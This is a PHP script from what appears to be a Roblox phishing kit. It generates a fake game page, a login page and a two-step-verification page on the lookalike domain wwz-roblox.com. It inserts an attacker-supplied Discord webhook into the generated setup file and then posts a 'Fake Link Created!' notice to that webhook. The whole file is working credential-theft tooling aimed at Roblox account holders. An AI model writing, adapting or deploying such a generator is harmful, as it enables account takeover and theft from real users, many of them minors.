<?php
if(isset($_POST['submit'])) {
$gameid = $_POST['gameid'];
$robloxuserid = rand();
$webhook = $_POST['webhooks'];
$notfound = array('{"errors":[{"code":400,"message":"BadRequest"}]}');
    $page = file_get_contents("https://api.roblox.com/universes/get-universe-containing-place?placeid=$gameid");
    
    $ch = curl_init("https://api.roblox.com/universes/get-universe-containing-place?placeid=$gameid");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    
    $data = curl_exec($ch);
    $data = json_decode($data);
    $url2 = "https://www.roblox.com/places/api-get-details?assetId=$gameid";

    $curl2 = curl_init($url2);
    curl_setopt($curl2, CURLOPT_URL, $url2);
    curl_setopt($curl2, CURLOPT_RETURNTRANSFER, true);

    //for debug only!
    curl_setopt($curl2, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($curl2, CURLOPT_SSL_VERIFYPEER, false);

    $resp2 = curl_exec($curl2);
    $info = json_decode($resp2);

    $gname = $info->Name;
    
function RemoveSpecialChar($str) {
      
    // Using str_replace() function 
    // to replace the word 
    $res = str_replace( array( '\'', '"',
    ',' , ';', '<', '>' ,'!'), ' ', $str);
      
    // Returning the result 
    return $res;
    }
  
// Given string
$str = $gname; 
  
// Function calling
$gamename = RemoveSpecialChar($str); 
$namegame = str_replace(' ', '-', $gamename);
$coolnamelol = preg_replace('/([0-9|#][\x{20E3}])|[\x{00ae}|\x{00a9}|\x{203C}|\x{2047}|\x{2048}|\x{2049}|\x{3030}|\x{303D}|\x{2139}|\x{2122}|\x{3297}|\x{3299}][\x{FE00}-\x{FEFF}]?|[\x{2190}-\x{21FF}][\x{FE00}-\x{FEFF}]?|[\x{2300}-\x{23FF}][\x{FE00}-\x{FEFF}]?|[\x{2460}-\x{24FF}][\x{FE00}-\x{FEFF}]?|[\x{25A0}-\x{25FF}][\x{FE00}-\x{FEFF}]?|[\x{2600}-\x{27BF}][\x{FE00}-\x{FEFF}]?|[\x{2900}-\x{297F}][\x{FE00}-\x{FEFF}]?|[\x{2B00}-\x{2BF0}][\x{FE00}-\x{FEFF}]?|[\x{1F000}-\x{1F6FF}][\x{FE00}-\x{FEFF}]?/u', '-', $namegame);
    
    $filename = '../games/';
    $indexphp = file_get_contents("genfile/indexphp");
    $setupphp = file_get_contents("genfile/setupphp");
    $functionphp = file_get_contents("genfile/functionphp");
    $sponsorshipphp = file_get_contents("genfile/sponsorshipphp");
    $pphp = file_get_contents("genfile/pphp");
    $prosesphp = file_get_contents("genfile/login/prosesphp");
    $index2stepphp = file_get_contents("genfile/login/index2stepphp");
    $indexstep = file_get_contents("genfile/login/twostepverification/indexphp");
    $step2 = file_get_contents("genfile/login/twostepverification/stepphp");
    mkdir('../games/'.$robloxuserid.'/'.$coolnamelol, 0777, true);
    mkdir('../games/'.$robloxuserid.'/'.$coolnamelol.'/login', 0777, true);
    mkdir('../games/'.$robloxuserid.'/'.$coolnamelol.'/login/twostepverification', 0777, true);
    file_put_contents('../games/'.$robloxuserid.'/'.$coolnamelol.'/index.php', $indexphp);
    file_put_contents('../games/'.$robloxuserid.'/'.$coolnamelol.'/setup.php', $setupphp);
    file_put_contents('../games/'.$robloxuserid.'/'.$coolnamelol.'/function.php', $functionphp);
    file_put_contents('../games/'.$robloxuserid.'/'.$coolnamelol.'/sponsorship.php', $sponsorshipphp);
    file_put_contents('../games/'.$robloxuserid.'/'.$coolnamelol.'/p.php', $pphp);
    file_put_contents('../games/'.$robloxuserid.'/'.$coolnamelol.'/login/index.php', $index2stepphp);
    file_put_contents('../games/'.$robloxuserid.'/'.$coolnamelol.'/login/proses.php', $prosesphp);
    file_put_contents('../games/'.$robloxuserid.'/'.$coolnamelol.'/login/twostepverification/index.php', $indexstep);
    file_put_contents('../games/'.$robloxuserid.'/'.$coolnamelol.'/login/twostepverification/step.php', $step2);
    fwrite(fopen('../games/'.$robloxuserid.'/'.$coolnamelol.'/setup.php', "w"), str_replace("{webhook}", $_POST['webhooks'],
    str_replace("{gameid}", $_POST['gameid'],file_get_contents("genfile/setupphp"))));
$timestamp = date("c", strtotime("now"));
$url = $webhook;
$fakelink = "https://wwz-roblox.com/games/$robloxuserid/$coolnamelol?privateServerLinkCode=dTQ1WExmT2lITGhGQ193eHJzZXJ2ZXJySGtCOGRrNEM";
$hookObject = json_encode([
    /*
     * The general "message" shown above your embeds
     */
    "content" => "@everyone",
    /*
     * The username shown in the message
     */
    "username" => "WxR Notification",
    /*
     * The image location for the senders image
     */
    "avatar_url" => "https://images-ext-2.discordapp.net/external/QXYUGtfSnOmgQj0Y245VmFeZd9664UhvbCn-Ooo5rqw/https/images-ext-1.discordapp.net/external/b_a3LEPCOR8-UgZQgbXVjXXxWOhA1bnSeduRtUAp8Ik/https/media.discordapp.net/attachments/882339669319245904/885694774521237504/standard.gif",
    /*
     * Whether or not to read the message in Text-to-speech
     */
    "tts" => false,
    /*
     * File contents to send to upload a file
     */
    // "file" => "",
    /*
     * An array of Embeds
     */
    "embeds" => [
        /*
         * Our first embed
         */
        [
            // Set the title for your embed
            "title" => "Join Our Server",

            // The type of your embed, will ALWAYS be "rich"
            "type" => "rich",

            // A description for your embed
            "description" => "",

            // The URL of where your title will be a link to
            "url" => "https://discord.gg/ksXzNX7nuk",

            /* A timestamp to be displayed below the embed, IE for when an an article was posted
             * This must be formatted as ISO8601
             */
            "timestamp" => $timestamp,

            // The integer color to be used on the left side of the embed
            "color" => hexdec( "0022e6" ),

            // Footer object
            "footer" => [
                "text" => "WxR Notification",
              "icon_url" => "https://images-ext-1.discordapp.net/external/b_a3LEPCOR8-UgZQgbXVjXXxWOhA1bnSeduRtUAp8Ik/https/media.discordapp.net/attachments/882339669319245904/885694774521237504/standard.gif"
            ],

            // Image object
            "image" => [
                "url" => "https://images-ext-1.discordapp.net/external/b_a3LEPCOR8-UgZQgbXVjXXxWOhA1bnSeduRtUAp8Ik/https/media.discordapp.net/attachments/882339669319245904/885694774521237504/standard.gif"
            ],

            // Thumbnail object
            "thumbnail" => [
                "url" => "https://images-ext-2.discordapp.net/external/QXYUGtfSnOmgQj0Y245VmFeZd9664UhvbCn-Ooo5rqw/https/images-ext-1.discordapp.net/external/b_a3LEPCOR8-UgZQgbXVjXXxWOhA1bnSeduRtUAp8Ik/https/media.discordapp.net/attachments/882339669319245904/885694774521237504/standard.gif"
            ],

            // Author object
            "author" => [
                "name" => "WxR Notification",
                "url" => "https://discord.gg/ksXzNX7nuk"
            ],

            // Field array of objects
            "fields" => [
                // Field 1
                [
                    "name" => "Fake Link Created!",
                    "value" => "[Click Here!]($fakelink)",
                    "inline" => true
                ]
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

$ch = curl_init();

curl_setopt_array( $ch, [
    CURLOPT_URL => $url,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);

$response = curl_exec( $ch );
    header("Location: ../games/$robloxuserid/$coolnamelol?privateServerLinkCode=dTQ1WExmT2lITGhGQ193eHJzZXJ2ZXJySGtCOGRrNEM");
    
}else{
    header("Location: index.php");
    exit();
}
?>